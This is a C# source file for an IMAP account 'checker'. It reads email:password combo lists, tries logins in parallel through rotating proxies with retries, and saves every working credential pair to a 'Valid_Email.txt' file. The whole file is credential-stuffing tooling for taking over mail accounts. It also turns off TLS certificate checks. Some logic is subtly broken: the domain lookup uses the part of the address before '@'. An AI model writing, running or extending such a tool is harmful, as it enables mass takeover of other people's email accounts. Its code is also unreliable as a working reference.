using MailKit;
using MailKit.Net.Imap;
using MailKit.Net.Proxy;
using MailKit.Search;
using MailKit.Security;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace EmailParser
{
    public sealed class EmailChecker
    {
        private readonly AppSettings _settings;
        private readonly Action<string> _log;

        public EmailChecker(AppSettings settings, Action<string> log)
        {
            _settings = settings;
            _log = log;
        }

        public static string GetDefaultOutputPath()
        {
            var baseDir = AppContext.BaseDirectory;
            try
            {
                if (!string.IsNullOrWhiteSpace(Environment.ProcessPath))
                {
                    var exeDir = Path.GetDirectoryName(Environment.ProcessPath);
                    if (!string.IsNullOrWhiteSpace(exeDir))
                        baseDir = exeDir;
                }
            }
            catch
            {
                // ignore
            }

            return Path.Combine(baseDir, "Result", "Valid_Email.txt");
        }

        public async Task RunAsync(CancellationToken ct, Action<ScrapeProgress> reportProgress)
        {
            var accountsPath = ResolveNearAppOrAbsolute(_settings.ImapAccountsFile);
            var serversPath  = ResolveNearAppOrAbsolute(_settings.ImapServersFile);
            var proxyPath    = string.IsNullOrWhiteSpace(_settings.ImapProxyFile) ? null : ResolveNearAppOrAbsolute(_settings.ImapProxyFile);

            if (!File.Exists(accountsPath))
                throw new FileNotFoundException("IMAP accounts file not found.", accountsPath);

            ct.ThrowIfCancellationRequested();
            var accounts = await Task.Run(() => LoadAccounts(accountsPath), ct).ConfigureAwait(false);
            if (accounts.Count == 0)
            {
                _log("No IMAP accounts found.");
                reportProgress(new ScrapeProgress("No accounts", 0));
                return;
            }

            ct.ThrowIfCancellationRequested();
            var servers = File.Exists(serversPath)
                ? await Task.Run(() => LoadServers(serversPath), ct).ConfigureAwait(false)
                : new Dictionary<string, ImapServerInfo>(StringComparer.OrdinalIgnoreCase);

            var proxyProtocol = ParseProxyProtocol(_settings.ImapProxyProtocol);
            var proxies = proxyPath != null && File.Exists(proxyPath)
                ? await Task.Run(() => LoadProxies(proxyPath, proxyProtocol), ct).ConfigureAwait(false)
                : new List<IProxyClient>();

            var parallelism = Math.Max(1, _settings.MaxParallelRequests);

            var validEmails    = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
            var totalAccounts  = accounts.Count;
            var completedAccounts = 0;

            var outputPath = GetDefaultOutputPath();
            Directory.CreateDirectory(Path.GetDirectoryName(outputPath) ?? AppContext.BaseDirectory);

            var writeGate = new object();
            using var outputStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write, FileShare.ReadWrite);
            using var outputWriter  = new StreamWriter(outputStream, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false))
            {
                AutoFlush = true
            };

            void WriteEmailRealTime(string email)
            {
                lock (writeGate)
                {
                    outputWriter.WriteLine(email);
                }
            }

            reportProgress(new ScrapeProgress("Checker starting\u2026", 0));

            var recheckEnabled      = _settings.MailRecheckEnabled;
            var maxAttemptsPerAccount = recheckEnabled
                ? (proxies.Count > 1 ? proxies.Count : 2)
                : 1;

            var retryQueue = new ConcurrentQueue<WorkItem>();

            var channel = System.Threading.Channels.Channel.CreateBounded<WorkItem>(
                new System.Threading.Channels.BoundedChannelOptions(parallelism * 4)
                {
                    SingleWriter  = true,
                    SingleReader  = false,
                    FullMode      = System.Threading.Channels.BoundedChannelFullMode.Wait
                });

            var producer = Task.Run(async () =>
            {
                for (var accountIndex = 0; accountIndex < accounts.Count; accountIndex++)
                {
                    var item = new WorkItem(accountIndex, accounts[accountIndex], 0);
                    await channel.Writer.WriteAsync(item, ct);
                }
                channel.Writer.TryComplete();
            }, ct);

            var workers = new List<Task>(parallelism);
            for (var w = 0; w < parallelism; w++)
            {
                workers.Add(Task.Run(async () =>
                {
                    while (await channel.Reader.WaitToReadAsync(ct))
                    {
                        while (channel.Reader.TryRead(out var item))
                        {
                            var result = await ProcessAccountAttemptAsync(
                                item.Account,
                                item.Index,
                                totalAccounts,
                                item.Attempt,
                                maxAttemptsPerAccount,
                                servers,
                                proxies,
                                validEmails,
                                WriteEmailRealTime,
                                ct);

                            if (result.ShouldRequeue)
                                retryQueue.Enqueue(item with { Attempt = item.Attempt + 1 });

                            if (result.IsFinal && !ct.IsCancellationRequested)
                            {
                                var done = Interlocked.Increment(ref completedAccounts);
                                var pct  = totalAccounts == 0 ? 0 : (done * 100.0 / totalAccounts);
                                reportProgress(new ScrapeProgress($"Accounts: {done}/{totalAccounts}", pct));
                            }
                        }
                    }
                }, ct));
            }

            await Task.WhenAll(workers.Prepend(producer));

            if (recheckEnabled)
            {
                while (!ct.IsCancellationRequested && !retryQueue.IsEmpty)
                {
                    var retryWorkers = new List<Task>(parallelism);
                    for (var w = 0; w < parallelism; w++)
                    {
                        retryWorkers.Add(Task.Run(async () =>
                        {
                            while (retryQueue.TryDequeue(out var item))
                            {
                                var result = await ProcessAccountAttemptAsync(
                                    item.Account,
                                    item.Index,
                                    totalAccounts,
                                    item.Attempt,
                                    maxAttemptsPerAccount,
                                    servers,
                                    proxies,
                                    validEmails,
                                    WriteEmailRealTime,
                                    ct);

                                if (result.ShouldRequeue)
                                    retryQueue.Enqueue(item with { Attempt = item.Attempt + 1 });

                                if (result.IsFinal && !ct.IsCancellationRequested)
                                {
                                    var done = Interlocked.Increment(ref completedAccounts);
                                    var pct  = totalAccounts == 0 ? 0 : (done * 100.0 / totalAccounts);
                                    reportProgress(new ScrapeProgress($"Accounts: {done}/{totalAccounts}", pct));
                                }
                            }
                        }, ct));
                    }

                    await Task.WhenAll(retryWorkers);
                }
            }

            _log($"\nDone. File: {outputPath}");
            reportProgress(new ScrapeProgress("Done", 100));
        }

        private sealed record AccountAttemptResult(bool IsFinal, bool ShouldRequeue);
        private sealed record WorkItem(int Index, RawAccount Account, int Attempt);

        private static bool IsRetryable(Exception ex)
        {
            return ex is ServiceNotConnectedException
                || ex is ImapProtocolException
                || ex is SslHandshakeException
                || ex is IOException
                || ex is TimeoutException
                || ex is global::System.Net.Sockets.SocketException;
        }

        private async Task<AccountAttemptResult> ProcessAccountAttemptAsync(
            RawAccount acc,
            int accountIndex,
            int totalAccounts,
            int attempt,
            int maxAttempts,
            Dictionary<string, ImapServerInfo> servers,
            List<IProxyClient> proxies,
            ConcurrentDictionary<string, byte> validEmails,
            Action<string> onNewEmail,
            CancellationToken ct)
        {
            ct.ThrowIfCancellationRequested();

            ResolvedAccount resolved;
            try
            {
                resolved = ResolveAccount(acc, servers);
            }
            catch (Exception ex)
            {
                _log($"\n[{accountIndex + 1}/{totalAccounts}] resolve error: {ex.Message}");
                return new AccountAttemptResult(IsFinal: true, ShouldRequeue: false);
            }

            var label = string.IsNullOrWhiteSpace(resolved.Username) ? "(unknown)" : resolved.Username;
            _log($"\n[{accountIndex + 1}/{totalAccounts}] {label} -> {resolved.Server}:{resolved.Port}");

            var effectiveSecurity = resolved.Port == 993 ? SecureSocketOptions.SslOnConnect : resolved.Security;

            IProxyClient? pickedProxy = null;
            var proxyIndex = -1;
            if (resolved.UseProxy && proxies.Count > 0)
            {
                proxyIndex  = (accountIndex + attempt) % proxies.Count;
                pickedProxy = proxies[proxyIndex];
            }

            if (attempt > 0)
            {
                if (proxyIndex >= 0)
                    _log($"  -> recheck: attempt {attempt + 1}/{maxAttempts} (proxy {proxyIndex + 1}/{proxies.Count})");
                else
                    _log($"  -> recheck: attempt {attempt + 1}/{maxAttempts}");
            }

            ImapClient CreateClient(bool forceTls12)
            {
                var c = new ImapClient();

                var timeoutMs = Math.Max(5000, Math.Min(10, _settings.RequestTimeoutSeconds) * 1000);
                c.Timeout = timeoutMs;

                c.CheckCertificateRevocation = false;
                c.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => true;
                c.SslProtocols = global::System.Security.Authentication.SslProtocols.Tls12;

                if (pickedProxy != null)
                    c.ProxyClient = pickedProxy;

                if (forceTls12)
                    c.SslProtocols = global::System.Security.Authentication.SslProtocols.Tls12;

                return c;
            }

            async Task ConnectAndAuthAsync(ImapClient c, int port, SecureSocketOptions security, bool forceTls12, CancellationToken token)
            {
                await c.ConnectAsync(resolved.Server, port, security, token);
                await c.AuthenticateAsync(resolved.Username, resolved.Password, token);
                _log("  -> connection: OK");
            }

            ImapClient? client = null;
            try
            {
                client = CreateClient(forceTls12: false);
                try
                {
                    await ConnectAndAuthAsync(client, resolved.Port, effectiveSecurity, false, ct);
                }
                catch (SslHandshakeException ex)
                {
                    _log("  -> connection failed (SSL/TLS): " + ex.Message);

                    var tlsAttempt = 0;
                    var attempts = resolved.Port == 993
                        ? new (string label, int port, SecureSocketOptions security, bool forceTls12)[]
                          {
                              ("retry (993)",      993, SecureSocketOptions.SslOnConnect, true),
                              ("retry (993)",      993, SecureSocketOptions.SslOnConnect, false),
                              ("fallback (143)",   143, SecureSocketOptions.StartTls,    false),
                              ("fallback (143)",   143, SecureSocketOptions.Auto,        false),
                          }
                        : new (string label, int port, SecureSocketOptions security, bool forceTls12)[]
                          {
                              ("retry",  resolved.Port, effectiveSecurity,              true),
                              ("retry",  resolved.Port, SecureSocketOptions.Auto,       false),
                              ("retry",  resolved.Port, SecureSocketOptions.StartTls,   false),
                          };

                    Exception? last = ex;
                    foreach (var a in attempts)
                    {
                        tlsAttempt++;
                        try { client.Dispose(); } catch { }
                        client = CreateClient(forceTls12: a.forceTls12);
                        _log($"  -> attempt {tlsAttempt}/{attempts.Length}: {a.label}");
                        try
                        {
                            await ConnectAndAuthAsync(client, a.port, a.security, a.forceTls12, ct);
                            last = null;
                            break;
                        }
                        catch (SslHandshakeException ex2)
                        {
                            last = ex2;
                            _log("  -> connection failed (SSL/TLS): " + ex2.Message);
                        }
                    }

                    if (last != null)
                        throw last;
                }

                var emailAddress = label;
                var resultLine   = string.IsNullOrWhiteSpace(resolved.Password)
                    ? emailAddress
                    : $"{emailAddress}:{resolved.Password}";

                if (validEmails.TryAdd(resultLine, 0))
                {
                    onNewEmail(resultLine);
                    _log($"  -> Valid: {resultLine}");
                }
                else
                {
                    _log($"  -> email already in list");
                }

                return new AccountAttemptResult(IsFinal: true, ShouldRequeue: false);
            }
            catch (MailKit.Security.AuthenticationException ex)
            {
                _log("  -> connection failed (auth): " + ex.Message);
                return new AccountAttemptResult(IsFinal: true, ShouldRequeue: false);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex) when (_settings.MailRecheckEnabled && (attempt + 1) < maxAttempts && IsRetryable(ex))
            {
                _log("  -> error: " + ex.Message);
                _log("  -> recheck: added to retry queue");
                return new AccountAttemptResult(IsFinal: false, ShouldRequeue: true);
            }
            catch (Exception ex)
            {
                _log("  -> error: " + ex.Message);
                return new AccountAttemptResult(IsFinal: true, ShouldRequeue: false);
            }
            finally
            {
                if (client != null)
                {
                    try { await client.DisconnectAsync(true, ct); } catch { }
                    try { client.Dispose(); } catch { }
                }
            }
        }

        #region Helper Methods

        private static string ResolveNearAppOrAbsolute(string relativePath)
        {
            if (string.IsNullOrWhiteSpace(relativePath))
                return relativePath;

            if (Path.IsPathRooted(relativePath))
                return relativePath;

            var appDir = string.Empty;
            try
            {
                if (!string.IsNullOrWhiteSpace(Environment.ProcessPath))
                    appDir = Path.GetDirectoryName(Environment.ProcessPath) ?? string.Empty;
            }
            catch
            {
                appDir = AppContext.BaseDirectory;
            }

            if (string.IsNullOrWhiteSpace(appDir))
                appDir = AppContext.BaseDirectory;

            var nearApp = Path.Combine(appDir, relativePath);
            return File.Exists(nearApp) ? nearApp : relativePath;
        }

        private static List<RawAccount> LoadAccounts(string path)
        {
            if (!File.Exists(path))
                return new List<RawAccount>();

            var result = new List<RawAccount>();
            foreach (var line in File.ReadAllLines(path))
            {
                var trimmed = line.Trim();
                if (string.IsNullOrWhiteSpace(trimmed) || trimmed.StartsWith("#"))
                    continue;

                var parts = trimmed.Split(new[] { ':' }, 2);
                if (parts.Length >= 2)
                {
                    result.Add(new RawAccount
                    {
                        Email    = parts[0].Trim(),
                        Password = parts[1].Trim()
                    });
                }
            }

            return result;
        }

        private static Dictionary<string, ImapServerInfo> LoadServers(string path)
        {
            var dict = new Dictionary<string, ImapServerInfo>(StringComparer.OrdinalIgnoreCase);

            static bool IsOn(string? v)
            {
                if (string.IsNullOrWhiteSpace(v)) return false;
                var s = v.Trim();
                return s.Equals("on",   StringComparison.OrdinalIgnoreCase)
                    || s.Equals("true", StringComparison.OrdinalIgnoreCase)
                    || s.Equals("1",    StringComparison.OrdinalIgnoreCase)
                    || s.Equals("yes",  StringComparison.OrdinalIgnoreCase);
            }

            static bool IsOff(string? v)
            {
                if (string.IsNullOrWhiteSpace(v)) return false;
                var s = v.Trim();
                return s.Equals("off",   StringComparison.OrdinalIgnoreCase)
                    || s.Equals("false", StringComparison.OrdinalIgnoreCase)
                    || s.Equals("0",     StringComparison.OrdinalIgnoreCase)
                    || s.Equals("no",    StringComparison.OrdinalIgnoreCase);
            }

            foreach (var raw in File.ReadAllLines(path))
            {
                var line = raw.Trim();
                if (string.IsNullOrWhiteSpace(line) || line.StartsWith("#") || line.StartsWith(";"))
                    continue;

                if (line.StartsWith("[") && line.EndsWith("]") && !line.Contains("[/", StringComparison.Ordinal))
                    continue;

                if (line.Contains("[DOMAINS]", StringComparison.OrdinalIgnoreCase)
                    && line.Contains("[/DOMAINS]", StringComparison.OrdinalIgnoreCase))
                {
                    var domainsRaw  = ExtractTagValue(line, "DOMAINS");
                    var serverRaw   = ExtractTagValue(line, "SERVER");
                    var portRaw     = ExtractTagValue(line, "PORT");
                    var sslRaw      = ExtractTagValue(line, "SSL");
                    var useProxyRaw = ExtractTagValue(line, "USEPROXY");

                    var server = (serverRaw ?? "").Trim().TrimStart('.').ToLowerInvariant();
                    if (string.IsNullOrWhiteSpace(server))
                        continue;

                    var port = 993;
                    if (!string.IsNullOrWhiteSpace(portRaw) && int.TryParse(portRaw.Trim(), out var p))
                        port = p;

                    SecureSocketOptions security;
                    if (port == 993)
                        security = SecureSocketOptions.SslOnConnect;
                    else if (IsOn(sslRaw))
                        security = SecureSocketOptions.SslOnConnect;
                    else if (IsOff(sslRaw))
                        security = SecureSocketOptions.StartTls;
                    else
                        security = port == 993 ? SecureSocketOptions.SslOnConnect : SecureSocketOptions.StartTls;

                    var useProxy = ParseBoolOrNull(useProxyRaw) ?? true;

                    foreach (var domain in SplitDomains(domainsRaw))
                        AddOrPreferServer(dict, domain, new ImapServerInfo(server, port, security, useProxy));

                    continue;
                }

                if (line.Contains('=') && !line.StartsWith("["))
                {
                    var idx        = line.IndexOf('=');
                    var domainPart = line.Substring(0, idx).Trim();
                    var valuePart  = line.Substring(idx + 1).Trim();
                    if (string.IsNullOrWhiteSpace(domainPart) || string.IsNullOrWhiteSpace(valuePart))
                        continue;

                    var domain = NormalizeDomainKey(domainPart);
                    var token  = valuePart.Split(new[] { ' ', '\t' }, 2, StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "";
                    if (string.IsNullOrWhiteSpace(token))
                        continue;

                    var server2 = token;
                    var port2   = 993;
                    if (TrySplitHostPort(token, out var host, out var parsedPort))
                    {
                        server2 = host;
                        port2   = parsedPort;
                    }

                    server2 = server2.Trim().TrimStart('.').ToLowerInvariant();
                    if (string.IsNullOrWhiteSpace(server2))
                        continue;

                    var security2 = port2 == 993 ? SecureSocketOptions.SslOnConnect : SecureSocketOptions.StartTls;
                    AddOrPreferServer(dict, domain, new ImapServerInfo(server2, port2, security2, true));
                    continue;
                }

                var parts = SplitLine(line);
                if (parts.Length < 2)
                    continue;

                var domainKey  = NormalizeDomainKey(parts[0]);
                var serverHost = parts[1].Trim().TrimStart('.').ToLowerInvariant();
                var serverPort = 993;
                if (parts.Length >= 3 && int.TryParse(parts[2].Trim(), out var parsedPort2))
                    serverPort = parsedPort2;

                if (!string.IsNullOrWhiteSpace(domainKey) && !string.IsNullOrWhiteSpace(serverHost))
                {
                    var mappedSecurity = serverPort == 993 ? SecureSocketOptions.SslOnConnect : SecureSocketOptions.StartTls;
                    AddOrPreferServer(dict, domainKey, new ImapServerInfo(serverHost, serverPort, mappedSecurity, true));
                }
            }

            return dict;
        }

        private static string? ExtractTagValue(string line, string tag)
        {
            var open  = "[" + tag + "]";
            var close = "[/" + tag + "]";

            var start = line.IndexOf(open, StringComparison.OrdinalIgnoreCase);
            if (start < 0) return null;
            start += open.Length;

            var end = line.IndexOf(close, start, StringComparison.OrdinalIgnoreCase);
            if (end < 0 || end <= start) return null;

            return line.Substring(start, end - start);
        }

        private static bool? ParseBoolOrNull(string? value)
        {
            if (string.IsNullOrWhiteSpace(value)) return null;
            if (bool.TryParse(value.Trim(), out var b)) return b;
            return null;
        }

        private static bool TrySplitHostPort(string token, out string host, out int port)
        {
            host = token;
            port = 993;

            var lastColon = token.LastIndexOf(':');
            if (lastColon <= 0 || lastColon == token.Length - 1)
                return false;

            var hostPart = token.Substring(0, lastColon);
            var portPart = token.Substring(lastColon + 1);
            if (!int.TryParse(portPart, out var p))
                return false;

            host = hostPart;
            port = p;
            return true;
        }

        private static string[] SplitLine(string line)
        {
            if (line.Contains(';')) return line.Split(';');
            if (line.Contains('|')) return line.Split('|');
            if (line.Contains(',')) return line.Split(',');

            var ws = line.Split(new[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries);
            return ws.Length >= 2 ? ws : new[] { line };
        }

        private static IEnumerable<string> SplitDomains(string? domainsRaw)
        {
            if (string.IsNullOrWhiteSpace(domainsRaw)) yield break;

            var parts = domainsRaw.Trim().Split(
                new[] { ',', ';', '|', ' ', '\t' },
                StringSplitOptions.RemoveEmptyEntries);

            foreach (var p in parts)
            {
                var d = NormalizeDomainKey(p);
                if (!string.IsNullOrWhiteSpace(d))
                    yield return d;
            }
        }

        private static string StripLeadingDigits(string value)
        {
            var i = 0;
            while (i < value.Length && char.IsDigit(value[i])) i++;
            return i == 0 ? value : value.Substring(i);
        }

        private static void AddOrPreferServer(Dictionary<string, ImapServerInfo> dict, string domain, ImapServerInfo info)
        {
            if (string.IsNullOrWhiteSpace(domain)) return;

            if (dict.TryGetValue(domain, out var existing))
            {
                var existingSsl = existing.Security == SecureSocketOptions.SslOnConnect;
                var newSsl      = info.Security    == SecureSocketOptions.SslOnConnect;

                if (!existingSsl && newSsl)
                {
                    dict[domain] = info;
                    return;
                }

                if (existingSsl == newSsl)
                {
                    if (existing.Port != 993 && info.Port == 993)
                        dict[domain] = info;
                }

                return;
            }

            dict[domain] = info;
        }

        private static string NormalizeDomainKey(string value)
            => value.Trim().TrimStart('@').ToLowerInvariant();

        private static ProxyProtocol ParseProxyProtocol(string? protocol)
        {
            var p = (protocol ?? "Socks5").Trim();
            if (p.Equals("http",  StringComparison.OrdinalIgnoreCase)
             || p.Equals("https", StringComparison.OrdinalIgnoreCase))
                return ProxyProtocol.Http;

            return ProxyProtocol.Socks5;
        }

        private static List<IProxyClient> LoadProxies(string path, ProxyProtocol protocol)
        {
            var result = new List<IProxyClient>();
            if (!File.Exists(path)) return result;

            foreach (var raw in File.ReadAllLines(path))
            {
                var line = raw.Trim();
                if (string.IsNullOrWhiteSpace(line) || line.StartsWith("#") || line.StartsWith(";"))
                    continue;

                if (!TryParseProxy(line, protocol, out var proxy) || proxy == null)
                    continue;

                result.Add(proxy);
            }

            return result;
        }

        private static bool TryParseProxy(string line, ProxyProtocol defaultProtocol, out IProxyClient? proxy)
        {
            proxy = null;
            try
            {
                if (line.Contains("://", StringComparison.Ordinal))
                {
                    var uri  = new Uri(line);
                    var host = uri.Host;
                    var port = uri.Port;
                    var user = "";
                    var pass = "";

                    if (!string.IsNullOrWhiteSpace(uri.UserInfo))
                    {
                        var ui = uri.UserInfo.Split(new[] { ':' }, 2);
                        user = ui[0];
                        pass = ui.Length > 1 ? ui[1] : "";
                    }

                    NetworkCredential? cred = null;
                    if (!string.IsNullOrWhiteSpace(user))
                        cred = new NetworkCredential(user, pass);

                    if (uri.Scheme.Equals("socks5", StringComparison.OrdinalIgnoreCase))
                        proxy = cred == null ? new Socks5Client(host, port) : new Socks5Client(host, port, cred);
                    else if (uri.Scheme.Equals("http",  StringComparison.OrdinalIgnoreCase)
                          || uri.Scheme.Equals("https", StringComparison.OrdinalIgnoreCase))
                        proxy = cred == null ? new HttpProxyClient(host, port) : new HttpProxyClient(host, port, cred);

                    return proxy != null;
                }

                if (!TryParseProxyNoScheme(line, out var host2, out var port2, out var user2, out var pass2))
                    return false;

                NetworkCredential? cred2 = null;
                if (!string.IsNullOrWhiteSpace(user2))
                    cred2 = new NetworkCredential(user2, pass2);

                proxy = defaultProtocol == ProxyProtocol.Http
                    ? (cred2 == null ? new HttpProxyClient(host2, port2) : new HttpProxyClient(host2, port2, cred2))
                    : (cred2 == null ? new Socks5Client(host2,   port2) : new Socks5Client(host2,   port2, cred2));

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool TryParseProxyNoScheme(string value, out string host, out int port, out string user, out string pass)
        {
            host = ""; port = 0; user = ""; pass = "";

            var line = value.Trim();
            if (string.IsNullOrWhiteSpace(line)) return false;

            string hostPort;
            var atIdx = line.LastIndexOf('@');
            if (atIdx > 0)
            {
                var creds = line.Substring(0, atIdx);
                hostPort  = line.Substring(atIdx + 1);
                var c = creds.Split(new[] { ':' }, 2);
                user = c[0];
                pass = c.Length > 1 ? c[1] : "";
            }
            else
            {
                hostPort = line;
            }

            var lastColon = hostPort.LastIndexOf(':');
            if (lastColon <= 0 || lastColon == hostPort.Length - 1) return false;

            host = hostPort.Substring(0, lastColon).Trim();
            var portStr = hostPort.Substring(lastColon + 1).Trim();
            if (string.IsNullOrWhiteSpace(host) || !int.TryParse(portStr, out port)) return false;

            return true;
        }

        private static ResolvedAccount ResolveAccount(RawAccount raw, Dictionary<string, ImapServerInfo> servers)
        {
            var email = (raw.Email ?? "").Trim();
            if (string.IsNullOrWhiteSpace(email))
                throw new ArgumentException("Email cannot be empty.");

            var domain = email.Contains("@")
                ? email.Split('@')[0].Trim()
                : throw new ArgumentException("Email must contain a domain.");

            var password = (raw.Password ?? "").Trim();
            if (string.IsNullOrWhiteSpace(password))
                throw new ArgumentException("Password cannot be empty.");

            if (servers.TryGetValue(domain, out var serverInfo))
            {
                return new ResolvedAccount
                {
                    Username = email,
                    Password = password,
                    Server   = serverInfo.Server,
                    Port     = serverInfo.Port,
                    Security = serverInfo.Security,
                    UseProxy = serverInfo.UseProxy
                };
            }

            throw new ArgumentException($"IMAP server for domain {domain} not found.");
        }

        private sealed record RawAccount
        {
            public string? Email    { get; init; }
            public string? Password { get; init; }
        }

        private sealed record ImapServerInfo(string Server, int Port, SecureSocketOptions Security, bool UseProxy);

        private sealed record ResolvedAccount
        {
            public string Username { get; init; } = string.Empty;
            public string Password { get; init; } = string.Empty;
            public string Server   { get; init; } = string.Empty;
            public int    Port     { get; init; }
            public SecureSocketOptions Security { get; init; }
            public bool UseProxy { get; init; }
        }

        private enum ProxyProtocol { Socks5, Http }

        #endregion
    }
}
